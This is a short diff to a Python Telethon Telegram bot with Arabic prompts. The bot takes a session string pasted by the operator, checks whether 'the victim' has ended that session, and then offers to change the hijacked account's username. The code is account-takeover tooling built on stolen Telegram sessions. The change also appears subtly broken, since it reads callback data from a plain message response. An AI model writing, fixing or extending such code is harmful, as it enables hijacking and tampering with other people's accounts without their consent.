@@ -840,7 +840,13 @@ inline_keyboard = [
 async def users(event):
     async with bot.conversation(event.chat_id) as x:
         await x.send_message("ماذا تريد أن تغير ؟", buttons=inline_keyboard)  # Asking for the user's choice
-        response = await x.wait_event(events.CallbackQuery())  # Getting the user's choice
+        response = await x.get_response()  # Getting the user's choice
+
+        await x.send_message("الان ارسل الكود تيرمكس")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if not op:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
 
         if response.data == b"Username":
             await x.send_message("ارسل اليوزر الجديد")
